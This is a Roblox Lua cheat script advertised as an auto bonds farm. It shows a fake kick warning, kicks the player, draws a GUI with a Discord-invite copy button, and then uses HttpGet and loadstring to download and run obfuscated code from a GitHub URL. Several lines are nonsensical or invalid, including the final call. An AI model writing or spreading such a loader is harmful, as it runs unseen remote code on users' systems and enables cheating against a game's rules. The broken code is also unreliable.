local a = game:GetService("Players").LocalPlayer
local b = a:Clone()
local c = game:GetService("CoreGui")
local d = c:Clone()
local e = d.StarterGui
e:Clone()
e:SetCore("SendNotification", {
    Title = "You were kicked",
    Text = "Tampering with interface detected.",
    Duration = 4
})
task.wait(4)
a:Kick("Unauthorized interface manipulation.")
local f = Instance.new("ScreenGui")
f.Name = "HealthBar"
f.IgnoreGuiInset = true
f.ResetOnSpawn = true
f.DisplayOrder = 100
f.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
f.Parent = c
local g = Instance.new("Frame")
g.Size = UDim2.new(0, 200, 0, 20)
g.Position = UDim2.new(0.5, -100, 0, 10)
g.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
g.BorderSizePixel = 0
g.BackgroundTransparency = 0.2
g.Parent = f
local h = Instance.new("ImageLabel")
h.Size = UDim2.new(1, 0, 1, 0)
h.Image = "rbxassetid://8795136368"
h.ImageTransparency = 0.5
h.BackgroundTransparency = 1
h.ScaleType = Enum.ScaleType.Stretch
h.Parent = g
local i = Instance.new("TextLabel")
i.Size = UDim2.new(1, 0, 1, 0)
i.Position = UDim2.new(0.5, 0, 0.5, 0)
i.Text = "MOON AUTO BONDS FARM v3"
i.TextColor3 = Color3.fromRGB(255, 255, 255)
i.Font = Enum.Font.SpecialElite
i.TextSize = 14
i.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
i.TextStrokeTransparency = 0.5
i.BackgroundTransparency = 1
i.Parent = g
local j = Instance.new("TextButton")
j.Size = UDim2.new(0, 150, 0, 30)
j.Position = UDim2.new(0.5, -75, 0, 40)
j.Text = "COPY DISCORD LINK"
j.TextColor3 = Color3.fromRGB(255, 255, 255)
j.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
j.AutoButtonColor = true
j.Font = Enum.Font.SpecialElite
j.TextSize = 14
j.Parent = g
local k = Instance.new("UICorner")
k.CornerRadius = UDim.new(0, 5)
k.Parent = j
j.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/tdH3ydTEwv")
    j.Text = "GOOD BOY! LINK COPIED!"
    task.wait(2)
    j.Text = "COPY DISCORD LINK"
end)
local l = game:HttpGet("https://raw.githubusercontent.com/iam-dhruvv/moon-roblos/refs/heads/main/Protected_51614319868903.lua.txt")
local m = loadstring(l)()
m.join up like a good boy for updated script()
